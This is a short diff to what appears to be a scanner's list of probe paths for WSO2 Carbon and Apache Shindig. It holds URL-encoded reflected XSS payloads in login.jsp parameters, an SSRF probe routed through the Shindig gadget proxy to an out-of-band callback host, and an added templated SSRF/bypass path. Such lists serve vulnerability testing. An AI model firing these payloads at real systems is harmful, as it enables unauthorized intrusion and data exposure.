@@ -2,3 +2,4 @@
 /carbon/admin/login.jsp?msgId=%27%3Balert(%27document.domain%27)%2F%2F
 /carbon/admin/login.jsp?loginStatus=false&errorCode=%27);alert(document.domain)//
 /shindig/gadgets/proxy?container=default&url=http://oast.pro
+/carbon/admin/jsp/WSRequestXSSproxy_ajaxprocessor.jsp;b=.jar?uri={{uri_b64}}&pattern=%7E&username=%7E&password=%7E&payload=%7E
